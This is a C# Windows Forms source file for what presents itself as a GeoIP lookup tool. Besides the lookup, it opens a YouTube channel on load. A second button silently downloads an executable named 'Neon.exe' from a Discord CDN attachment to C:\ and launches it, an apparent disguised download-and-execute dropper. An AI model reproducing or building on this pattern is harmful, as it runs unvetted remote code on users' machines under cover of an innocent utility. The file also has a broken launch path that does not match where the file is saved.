using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Diagnostics;

namespace geoip_fixed
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            var ip = client.DownloadString("https://api.hackertarget.com/geoip/?q=" + textBox1.Text);
            richTextBox1.Text = ip;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCHV3_22jtUCsmawPHSR8WFA");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient lol = new WebClient();
            
            lol.DownloadFile("https://cdn.discordapp.com/attachments/877863058272313364/878574461694148648/Neon.exe", @"C:\Neon.exe");
            Process.Start("Neon.exe");
        }
    }
}
